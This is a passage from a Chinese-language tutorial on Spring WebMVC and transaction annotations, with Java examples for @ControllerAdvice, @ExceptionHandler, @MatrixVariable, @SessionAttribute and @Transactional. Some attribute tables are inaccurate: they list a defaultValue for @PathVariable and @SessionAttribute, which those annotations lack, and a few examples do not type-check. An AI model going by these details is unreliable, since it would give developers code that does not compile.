       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DruidDataSource</span>();
   }
}
<span class="hljs-comment">// 事务配置在数据源配置之后解析</span>
<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@AutoConfigureAfter(DataSourceConfig.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransactionConfig</span> {
   <span class="hljs-meta">@Bean</span>
   <span class="hljs-keyword">public</span> TransactionManager <span class="hljs-title function_">transactionManager</span><span class="hljs-params">(DataSource dataSource)</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSourceTransactionManager</span>(dataSource);
   }
}
</code></pre>
<h2 data-id="heading-21">二、WebMVC 相关注解</h2>
<p>WebMVC 注解是 Spring MVC 处理请求、响应、参数绑定、异常处理的核心，专注于 Web 层的请求处理逻辑。</p>
<h3 data-id="heading-22">1. @ControllerAdvice</h3>
<p><code>@ControllerAdvice</code> 是 “控制器增强器”，全局拦截 Controller 的请求处理流程，配合以下注解使用：</p>
<ul>
<li><code>@ExceptionHandler</code>：全局异常处理；</li>
<li><code>@InitBinder</code>：全局参数绑定；</li>
<li><code>@ModelAttribute</code>：全局模型属性设置；</li>
<li>扩展能力：实现<code>ResponseBodyAdvice</code>/<code>RequestBodyAdvice</code>，拦截请求 / 响应处理。</li>
</ul>
<p><strong>属性说明：</strong></p>

























<table><thead><tr><th>属性名</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>basePackages</td><td>拦截的基础包路径</td><td>仅指定包下的 Controller 被拦截，如<code>basePackages = "com.example.controller"</code></td></tr><tr><td>assignableTypes</td><td>拦截的 Controller 父类 / 接口</td><td>仅继承指定 Class 的 Controller 被拦截，如<code>assignableTypes = BaseController.class</code></td></tr><tr><td>annotations</td><td>拦截的 Controller 注解</td><td>仅标注指定注解的 Controller 被拦截，如<code>annotations = RestController.class</code></td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 全局增强器，拦截所有@RestController标注的控制器</span>
<span class="hljs-meta">@ControllerAdvice(annotations = RestController.class)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GlobalControllerAdvice</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ResponseBodyAdvice</span>&lt;Object&gt;, RequestBodyAdvice {
   <span class="hljs-comment">// 全局异常处理</span>
   <span class="hljs-meta">@ExceptionHandler(Exception.class)</span>
   <span class="hljs-keyword">public</span> ResponseEntity&lt;ErrorResponse&gt; <span class="hljs-title function_">handleException</span><span class="hljs-params">(Exception e)</span> {
       <span class="hljs-type">ErrorResponse</span> <span class="hljs-variable">response</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ErrorResponse</span>(HttpStatus.INTERNAL_SERVER_ERROR.value(), e.getMessage());
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResponseEntity</span>&lt;&gt;(response, HttpStatus.INTERNAL_SERVER_ERROR);
   }
   <span class="hljs-comment">// 全局参数绑定（日期格式）</span>
   <span class="hljs-meta">@InitBinder</span>
   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initBinder</span><span class="hljs-params">(WebDataBinder binder)</span> {
       <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">sdf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>);
       binder.registerCustomEditor(Date.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomDateEditor</span>(sdf, <span class="hljs-literal">true</span>));
   }
   <span class="hljs-comment">// 全局模型属性</span>
   <span class="hljs-meta">@ModelAttribute</span>
   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addGlobalModelAttribute</span><span class="hljs-params">(Model model)</span> {
       model.addAttribute(<span class="hljs-string">"appName"</span>, <span class="hljs-string">"SpringMVC Demo"</span>);
   }
   <span class="hljs-comment">// 拦截@ResponseBody响应，自定义处理</span>
   <span class="hljs-meta">@Override</span>
   <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">beforeBodyWrite</span><span class="hljs-params">(Object body, MethodParameter returnType, MediaType selectedContentType,
                                 Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt; selectedConverterType,
                                 ServerHttpRequest request, ServerHttpResponse response)</span> {
       <span class="hljs-comment">// 统一响应格式</span>
       <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Result</span>&lt;&gt;(<span class="hljs-string">"success"</span>, body);
   }
   <span class="hljs-comment">// 拦截@RequestBody请求，自定义处理</span>
   <span class="hljs-meta">@Override</span>
   <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">afterBodyRead</span><span class="hljs-params">(Object body, HttpInputMessage inputMessage, MethodParameter parameter,
                               Class&lt;?&gt; targetType, Class&lt;? extends HttpMessageConverter&lt;?&gt;&gt; converterType)</span> {
       <span class="hljs-comment">// 请求参数预处理</span>
       <span class="hljs-keyword">return</span> body;
   }
   <span class="hljs-comment">// 其他接口实现...</span>
}
</code></pre>
<h3 data-id="heading-23">2. @ExceptionHandler</h3>
<p><code>@ExceptionHandler</code> 用于处理 Controller 中的异常，可局部（Controller 内）或全局（配合<code>@ControllerAdvice</code>）使用。</p>
<ul>
<li>核心优势：精准捕获指定异常，统一异常响应格式，避免重复 try-catch。</li>
</ul>
<p><strong>属性说明：</strong></p>














<table><thead><tr><th>属性名</th><th>说明</th></tr></thead><tbody><tr><td>value</td><td>需处理的异常类型数组</td><td>如<code>value = {NullPointerException.class, IllegalArgumentException.class}</code></td></tr></tbody></table>
<p><strong>示例（全局异常处理）</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@ControllerAdvice</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GlobalExceptionHandler</span> {
   <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">log</span> <span class="hljs-operator">=</span> LoggerFactory.getLogger(GlobalExceptionHandler.class);
   <span class="hljs-comment">// 处理业务异常</span>
   <span class="hljs-meta">@ExceptionHandler(BusinessException.class)</span>
   <span class="hljs-meta">@ResponseBody</span>
   <span class="hljs-keyword">public</span> Result&lt;Void&gt; <span class="hljs-title function_">handleBusinessException</span><span class="hljs-params">(BusinessException e)</span> {
       log.warn(<span class="hljs-string">"业务异常：{}"</span>, e.getMessage());
       <span class="hljs-keyword">return</span> Result.fail(e.getCode(), e.getMessage());
   }
   <span class="hljs-comment">// 处理参数校验异常</span>
   <span class="hljs-meta">@ExceptionHandler(MethodArgumentNotValidException.class)</span>
   <span class="hljs-meta">@ResponseBody</span>
   <span class="hljs-keyword">public</span> Result&lt;Void&gt; <span class="hljs-title function_">handleValidException</span><span class="hljs-params">(MethodArgumentNotValidException e)</span> {
       <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> e.getBindingResult().getFieldError().getDefaultMessage();
       log.warn(<span class="hljs-string">"参数校验异常：{}"</span>, message);
       <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-number">400</span>, message);
   }
   <span class="hljs-comment">// 处理所有未捕获的异常</span>
   <span class="hljs-meta">@ExceptionHandler(Exception.class)</span>
   <span class="hljs-meta">@ResponseBody</span>
   <span class="hljs-meta">@ResponseStatus(HttpStatus.INTERNAL_SERVER_ERROR)</span>
   <span class="hljs-keyword">public</span> Result&lt;Void&gt; <span class="hljs-title function_">handleException</span><span class="hljs-params">(Exception e)</span> {
       log.error(<span class="hljs-string">"系统异常"</span>, e);
       <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-number">500</span>, <span class="hljs-string">"服务器内部错误"</span>);
   }
}
<span class="hljs-comment">// 统一响应结果</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Result</span>&lt;T&gt; {
   <span class="hljs-keyword">private</span> String code;
   <span class="hljs-keyword">private</span> String message;
   <span class="hljs-keyword">private</span> T data;
   <span class="hljs-comment">// 静态方法：success/fail...</span>
}
</code></pre>
<h3 data-id="heading-24">3. @InitBinder</h3>
<p><code>@InitBinder</code> 用于自定义 Web 请求参数到 Bean 的绑定规则，解决特殊类型（如日期、枚举）的参数转换问题。</p>
<ul>
<li>作用域：局部（Controller 内）或全局（配合<code>@ControllerAdvice</code>）。</li>
</ul>
<p><strong>示例（全局日期参数绑定）</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@ControllerAdvice</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GlobalInitBinder</span> {
   <span class="hljs-comment">// 绑定多种日期格式</span>
   <span class="hljs-meta">@InitBinder</span>
   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initDateBinder</span><span class="hljs-params">(WebDataBinder binder)</span> {
       <span class="hljs-comment">// 支持yyyy-MM-dd和yyyy-MM-dd HH:mm:ss两种格式</span>
       <span class="hljs-type">CustomDateEditor</span> <span class="hljs-variable">dateEditor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomDateEditor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FlexibleDateFormat</span>(), <span class="hljs-literal">true</span>);
       binder.registerCustomEditor(Date.class, dateEditor);
   }
   <span class="hljs-comment">// 自定义枚举转换器</span>
   <span class="hljs-meta">@InitBinder</span>
   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initEnumBinder</span><span class="hljs-params">(WebDataBinder binder)</span> {
       binder.registerCustomEditor(StatusEnum.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">EnumEditor</span>(StatusEnum.class));
   }
   <span class="hljs-comment">// 灵活的日期格式解析器</span>
   <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FlexibleDateFormat</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DateFormat</span> {
       <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> List&lt;SimpleDateFormat&gt; formats = Arrays.asList(
           <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">"yyyy-MM-dd"</span>),
           <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">"yyyy-MM-dd HH:mm:ss"</span>)
       );
       <span class="hljs-meta">@Override</span>
       <span class="hljs-keyword">public</span> StringBuffer <span class="hljs-title function_">format</span><span class="hljs-params">(Date date, StringBuffer toAppendTo, FieldPosition fieldPosition)</span> {
           <span class="hljs-keyword">return</span> formats.get(<span class="hljs-number">0</span>).format(date, toAppendTo, fieldPosition);
       }
       <span class="hljs-meta">@Override</span>
       <span class="hljs-keyword">public</span> Date <span class="hljs-title function_">parse</span><span class="hljs-params">(String source, ParsePosition pos)</span> {
           <span class="hljs-keyword">for</span> (SimpleDateFormat format : formats) {
               <span class="hljs-type">ParsePosition</span> <span class="hljs-variable">parsePos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ParsePosition</span>(<span class="hljs-number">0</span>);
               <span class="hljs-type">Date</span> <span class="hljs-variable">date</span> <span class="hljs-operator">=</span> format.parse(source, parsePos);
               <span class="hljs-keyword">if</span> (date != <span class="hljs-literal">null</span>) {
                   pos.setIndex(parsePos.getIndex());
                   pos.setErrorIndex(parsePos.getErrorIndex());
                   <span class="hljs-keyword">return</span> date;
               }
           }
           <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
       }
   }
}
</code></pre>
<h3 data-id="heading-25">4. @ModelAttribute</h3>
<p><code>@ModelAttribute</code> 用于在 Controller 方法执行前，向 Model 中添加通用属性，适用于页面渲染（前后端不分离场景）。</p>
<ul>
<li>全局使用：配合<code>@ControllerAdvice</code>，为所有 Controller 添加通用模型属性。</li>
</ul>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@ControllerAdvice(basePackages = "com.example.controller")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GlobalModelAttribute</span> {
   <span class="hljs-comment">// 为所有请求添加当前登录用户信息</span>
   <span class="hljs-meta">@ModelAttribute("currentUser")</span>
   <span class="hljs-keyword">public</span> User <span class="hljs-title function_">getCurrentUser</span><span class="hljs-params">(HttpServletRequest request)</span> {
       <span class="hljs-type">String</span> <span class="hljs-variable">token</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">"token"</span>);
       <span class="hljs-keyword">return</span> UserContext.getCurrentUser(token); <span class="hljs-comment">// 从上下文获取登录用户</span>
   }
}
<span class="hljs-comment">// 页面中可直接使用${currentUser.name}</span>
<span class="hljs-meta">@Controller</span>
<span class="hljs-meta">@RequestMapping("/user")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
   <span class="hljs-meta">@GetMapping("/info")</span>
   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">userInfo</span><span class="hljs-params">()</span> {
       <span class="hljs-keyword">return</span> <span class="hljs-string">"user/info"</span>; <span class="hljs-comment">// 页面渲染时可获取currentUser</span>
   }
}
</code></pre>
<h3 data-id="heading-26">5. @CookieValue</h3>
<p><code>@CookieValue</code> 用于从 HTTP Cookie 中获取指定值，绑定到 Controller 方法参数。</p>
<ul>
<li>核心特性：支持默认值，避免 Cookie 不存在时抛异常。</li>
</ul>
<p><strong>属性说明：</strong></p>



















<table><thead><tr><th>属性名</th><th>说明</th></tr></thead><tbody><tr><td>required</td><td>是否必须存在</td><td>① <code>true</code>（默认）：Cookie 不存在抛异常；② <code>false</code>：不存在则为 null</td></tr><tr><td>defaultValue</td><td>默认值</td><td>Cookie 不存在时使用，如<code>defaultValue = "guest"</code></td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/cookie")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CookieController</span> {
   <span class="hljs-meta">@GetMapping("/get")</span>
   <span class="hljs-keyword">public</span> Result&lt;String&gt; <span class="hljs-title function_">getCookie</span><span class="hljs-params">(
       <span class="hljs-meta">@CookieValue(value = "userId", required = false, defaultValue = "0")</span> String userId
   )</span> {
       <span class="hljs-keyword">return</span> Result.success(<span class="hljs-string">"用户ID："</span> + userId);
   }
}
</code></pre>
<h3 data-id="heading-27">6. @MatrixVariable</h3>
<p><code>@MatrixVariable</code> 用于获取URL 中的矩阵变量（以<code>;</code>分隔的键值对），如<code>/user/info;id=1;name=test</code>。</p>
<ul>
<li>注意：Spring MVC 默认禁用矩阵变量，需手动开启：</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebConfig</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">WebMvcConfigurer</span> {
   <span class="hljs-meta">@Override</span>
   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configurePathMatch</span><span class="hljs-params">(PathMatchConfigurer configurer)</span> {
       <span class="hljs-type">UrlPathHelper</span> <span class="hljs-variable">urlPathHelper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UrlPathHelper</span>();
       urlPathHelper.setRemoveSemicolonContent(<span class="hljs-literal">false</span>); <span class="hljs-comment">// 开启矩阵变量</span>
       configurer.setUrlPathHelper(urlPathHelper);
   }
}
</code></pre>
<p><strong>属性说明：</strong></p>



































<table><thead><tr><th>属性名</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>value</td><td>矩阵变量名</td><td>与<code>name</code>等价</td></tr><tr><td>name</td><td>矩阵变量名</td><td>如<code>name = "id"</code></td></tr><tr><td>pathVar</td><td>路径变量名</td><td>匹配指定路径变量中的矩阵变量，如<code>pathVar = "userPath"</code></td></tr><tr><td>required</td><td>是否必须存在</td><td>① <code>true</code>（默认）：不存在抛异常；② <code>false</code>：不存在则为 null</td></tr><tr><td>defaultValue</td><td>默认值</td><td>变量不存在时使用</td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/matrix")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MatrixVariableController</span> {
   <span class="hljs-comment">// 匹配URL：/matrix/user/info;id=1;name=test</span>
   <span class="hljs-meta">@GetMapping("/user/{userPath}")</span>
   <span class="hljs-keyword">public</span> Result&lt;Map&lt;String, String&gt;&gt; <span class="hljs-title function_">getMatrixVariable</span><span class="hljs-params">(
       <span class="hljs-meta">@MatrixVariable(name = "id", pathVar = "userPath")</span> String id,
       <span class="hljs-meta">@MatrixVariable(name = "name", pathVar = "userPath", defaultValue = "guest")</span> String name
   )</span> {
       Map&lt;String, String&gt; data = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
       data.put(<span class="hljs-string">"id"</span>, id);
       data.put(<span class="hljs-string">"name"</span>, name);
       <span class="hljs-keyword">return</span> Result.success(data);
   }
}
</code></pre>
<h3 data-id="heading-28">7. @PathVariable</h3>
<p><code>@PathVariable</code> 用于获取 URL 路径中的变量（以<code>{}</code>声明），是 RESTful API 的核心注解。</p>
<p><strong>属性说明：</strong></p>



















<table><thead><tr><th>属性名</th><th>说明</th></tr></thead><tbody><tr><td>required</td><td>是否必须存在</td><td>① <code>true</code>（默认）：不存在抛异常；② <code>false</code>：不存在则为 null</td></tr><tr><td>defaultValue</td><td>默认值</td><td>路径变量不存在时使用</td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/path")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PathVariableController</span> {
   <span class="hljs-comment">// 匹配URL：/path/user/123/detail</span>
   <span class="hljs-meta">@GetMapping("/user/{userId}/detail")</span>
   <span class="hljs-keyword">public</span> Result&lt;User&gt; <span class="hljs-title function_">getUser</span><span class="hljs-params">(
       <span class="hljs-meta">@PathVariable(value = "userId", required = true)</span> Long userId
   )</span> {
       <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(userId, <span class="hljs-string">"测试用户"</span>);
       <span class="hljs-keyword">return</span> Result.success(user);
   }
}
</code></pre>
<h3 data-id="heading-29">8. @RequestAttribute</h3>
<p><code>@RequestAttribute</code> 用于获取 HTTP Request 中的属性值，适用于请求转发 / 包含场景（如过滤器中设置的属性）。</p>
<p><strong>属性说明：</strong></p>














<table><thead><tr><th>属性名</th><th>说明</th></tr></thead><tbody><tr><td>required</td><td>是否必须存在</td><td>① <code>true</code>（默认）：不存在抛异常；② <code>false</code>：不存在则为 null</td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/request")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestAttributeController</span> {
   <span class="hljs-comment">// 设置请求属性</span>
   <span class="hljs-meta">@GetMapping("/setAttr")</span>
   <span class="hljs-keyword">public</span> String <span class="hljs-title function_">setRequestAttribute</span><span class="hljs-params">(HttpServletRequest request)</span> {
       request.setAttribute(<span class="hljs-string">"traceId"</span>, UUID.randomUUID().toString());
       <span class="hljs-keyword">return</span> <span class="hljs-string">"forward:/request/getAttr"</span>; <span class="hljs-comment">// 请求转发</span>
   }
   <span class="hljs-comment">// 获取请求属性</span>
   <span class="hljs-meta">@GetMapping("/getAttr")</span>
   <span class="hljs-keyword">public</span> Result&lt;String&gt; <span class="hljs-title function_">getRequestAttribute</span><span class="hljs-params">(
       <span class="hljs-meta">@RequestAttribute(value = "traceId", required = false)</span> String traceId
   )</span> {
       <span class="hljs-keyword">return</span> Result.success(<span class="hljs-string">"追踪ID："</span> + traceId);
   }
}
</code></pre>
<h3 data-id="heading-30">9. @RequestPart</h3>
<p><code>@RequestPart</code> 用于处理<code>multipart/form-data</code>类型的请求，适用于文件上传、复杂参数提交（如 JSON、XML）。</p>
<ul>
<li>核心区别：<code>@RequestParam</code>仅处理简单表单字段，<code>@RequestPart</code>支持复杂类型和文件。</li>
</ul>
<p><strong>示例（文件上传 + JSON 参数）</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/upload")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RequestPartController</span> {
   <span class="hljs-comment">// 接收文件+JSON参数</span>
   <span class="hljs-meta">@PostMapping("/file")</span>
   <span class="hljs-keyword">public</span> Result&lt;String&gt; <span class="hljs-title function_">uploadFile</span><span class="hljs-params">(
       <span class="hljs-meta">@RequestPart("file")</span> MultipartFile file, // 上传的文件
       <span class="hljs-meta">@RequestPart("user")</span> <span class="hljs-meta">@Valid</span> User user // JSON格式的用户信息
   )</span> {
       <span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> file.getOriginalFilename();
       <span class="hljs-comment">// 处理文件上传和用户信息</span>
       <span class="hljs-keyword">return</span> Result.success(<span class="hljs-string">"文件："</span> + fileName + <span class="hljs-string">" 上传成功，用户："</span> + user.getName());
   }
}
<span class="hljs-comment">// 请求示例（Postman）：</span>
<span class="hljs-comment">// Content-Type: multipart/form-data</span>
<span class="hljs-comment">// 表单字段：</span>
<span class="hljs-comment">// - file：选择文件</span>
<span class="hljs-comment">// - user：{"name":"test","age":20}（JSON格式）</span>
</code></pre>
<h3 data-id="heading-31">10. @ResponseStatus</h3>
<p><code>@ResponseStatus</code> 用于设置 HTTP 响应状态码，可标注在 Controller 方法或异常类上。</p>
<ul>
<li>核心用途：自定义异常的响应状态码，或修改正常请求的状态码。</li>
</ul>
<p><strong>属性说明：</strong></p>

























<table><thead><tr><th>属性名</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>value</td><td>响应状态码</td><td>如<code>HttpStatus.CREATED</code>（201）、<code>HttpStatus.BAD_REQUEST</code>（400）</td></tr><tr><td>code</td><td>同 value</td><td>语义等价，推荐使用 value</td></tr><tr><td>reason</td><td>响应描述</td><td>状态码对应的描述信息，如<code>reason = "参数错误"</code></td></tr></tbody></table>
<p><strong>示例 1：标注在方法上</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/status")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResponseStatusController</span> {
   <span class="hljs-comment">// 响应状态码：201 Created</span>
   <span class="hljs-meta">@PostMapping("/create")</span>
   <span class="hljs-meta">@ResponseStatus(value = HttpStatus.CREATED, reason = "资源创建成功")</span>
   <span class="hljs-keyword">public</span> Result&lt;Void&gt; <span class="hljs-title function_">createResource</span><span class="hljs-params">()</span> {
       <span class="hljs-comment">// 处理资源创建逻辑</span>
       <span class="hljs-keyword">return</span> Result.success();
   }
}
</code></pre>
<p><strong>示例 2：标注在异常类上</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 自定义异常，指定响应状态码</span>
<span class="hljs-meta">@ResponseStatus(value = HttpStatus.NOT_FOUND, reason = "资源不存在")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ResourceNotFoundException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RuntimeException</span> {
   <span class="hljs-keyword">public</span> <span class="hljs-title function_">ResourceNotFoundException</span><span class="hljs-params">(String message)</span> {
       <span class="hljs-built_in">super</span>(message);
   }
}
<span class="hljs-comment">// Controller中抛出异常，自动返回404</span>
<span class="hljs-meta">@GetMapping("/resource/{id}")</span>
<span class="hljs-keyword">public</span> Result&lt;Resource&gt; <span class="hljs-title function_">getResource</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
   <span class="hljs-type">Resource</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> resourceService.getById(id);
   <span class="hljs-keyword">if</span> (resource == <span class="hljs-literal">null</span>) {
       <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceNotFoundException</span>(<span class="hljs-string">"资源ID："</span> + id + <span class="hljs-string">" 不存在"</span>);
   }
   <span class="hljs-keyword">return</span> Result.success(resource);
}
</code></pre>
<h3 data-id="heading-32">11. @SessionAttribute</h3>
<p><code>@SessionAttribute</code> 用于从 HTTP Session 中获取指定属性值，适用于会话级数据（如登录状态、用户信息）。</p>
<p><strong>属性说明：</strong></p>



















<table><thead><tr><th>属性名</th><th>说明</th></tr></thead><tbody><tr><td>required</td><td>是否必须存在</td><td>① <code>true</code>（默认）：不存在抛异常；② <code>false</code>：不存在则为 null</td></tr><tr><td>defaultValue</td><td>默认值</td><td>Session 属性不存在时使用</td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/session")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SessionAttributeController</span> {
   <span class="hljs-comment">// 设置Session属性</span>
   <span class="hljs-meta">@GetMapping("/login")</span>
   <span class="hljs-keyword">public</span> Result&lt;Void&gt; <span class="hljs-title function_">login</span><span class="hljs-params">(HttpSession session)</span> {
       <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-number">1L</span>, <span class="hljs-string">"admin"</span>);
       session.setAttribute(<span class="hljs-string">"loginUser"</span>, user); <span class="hljs-comment">// 存储登录用户</span>
       <span class="hljs-keyword">return</span> Result.success(<span class="hljs-string">"登录成功"</span>);
   }
   <span class="hljs-comment">// 获取Session属性</span>
   <span class="hljs-meta">@GetMapping("/user")</span>
   <span class="hljs-keyword">public</span> Result&lt;User&gt; <span class="hljs-title function_">getLoginUser</span><span class="hljs-params">(
       <span class="hljs-meta">@SessionAttribute(value = "loginUser", required = false)</span> User loginUser
   )</span> {
       <span class="hljs-keyword">if</span> (loginUser == <span class="hljs-literal">null</span>) {
           <span class="hljs-keyword">return</span> Result.fail(<span class="hljs-number">401</span>, <span class="hljs-string">"未登录"</span>);
       }
       <span class="hljs-keyword">return</span> Result.success(loginUser);
   }
}
</code></pre>
<h2 data-id="heading-33">三、事务管理相关注解</h2>
<p>事务管理注解是 Spring 实现声明式事务的核心，通过注解快速配置事务属性，替代传统 XML 事务配置。</p>
<h3 data-id="heading-34">1. @Transactional</h3>
<p><code>@Transactional</code> 是声明式事务的核心注解，标注在类或方法上，指定该类 / 方法的事务属性。</p>
<ul>
<li>类级注解：所有 public 方法继承事务属性；</li>
<li>方法级注解：优先级高于类级，可单独配置；</li>
<li>底层依赖：AOP 动态代理实现事务增强，默认仅捕获运行时异常（<code>RuntimeException</code>）。</li>
</ul>
<p><strong>属性说明：</strong></p>




























































<table><thead><tr><th>属性名</th><th>说明</th><th>补充说明</th></tr></thead><tbody><tr><td>value</td><td>事务管理器名称</td><td>如<code>value = "transactionManager"</code>，多数据源时指定</td></tr><tr><td>transactionManager</td><td>同 value</td><td>语义更清晰，推荐使用</td></tr><tr><td>propagation</td><td>事务传播行为</td><td>枚举值，如<code>REQUIRED</code>（默认）、<code>REQUIRES_NEW</code>、<code>SUPPORTS</code>等</td></tr><tr><td>isolation</td><td>事务隔离级别</td><td>枚举值，如<code>DEFAULT</code>（默认，跟随数据库）、<code>READ_COMMITTED</code>、<code>SERIALIZABLE</code>等</td></tr><tr><td>timeout</td><td>事务超时时间（秒）</td><td>默认为 - 1（无超时），超时抛出<code>TransactionTimedOutException</code></td></tr><tr><td>readOnly</td><td>是否只读事务</td><td>① <code>true</code>：只读（查询操作，优化性能）；② <code>false</code>（默认）：读写事务</td></tr><tr><td>rollbackFor</td><td>触发回滚的异常类型</td><td>数组形式，如<code>rollbackFor = {SQLException.class, BusinessException.class}</code></td></tr><tr><td>rollbackForClassName</td><td>触发回滚的异常类名</td><td>字符串数组，如<code>rollbackForClassName = "java.sql.SQLException"</code></td></tr><tr><td>noRollbackFor</td><td>不触发回滚的异常类型</td><td>数组形式，如<code>noRollbackFor = IllegalArgumentException.class</code></td></tr><tr><td>noRollbackForClassName</td><td>不触发回滚的异常类名</td><td>字符串数组，如<code>noRollbackForClassName = "java.lang.IllegalArgumentException"</code></td></tr></tbody></table>
<p><strong>示例</strong>：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Transactional(readOnly = true)</span> <span class="hljs-comment">// 类级：所有public方法默认只读事务</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
   <span class="hljs-comment">// 方法级：覆盖类级配置，读写事务，超时30秒，指定异常回滚</span>
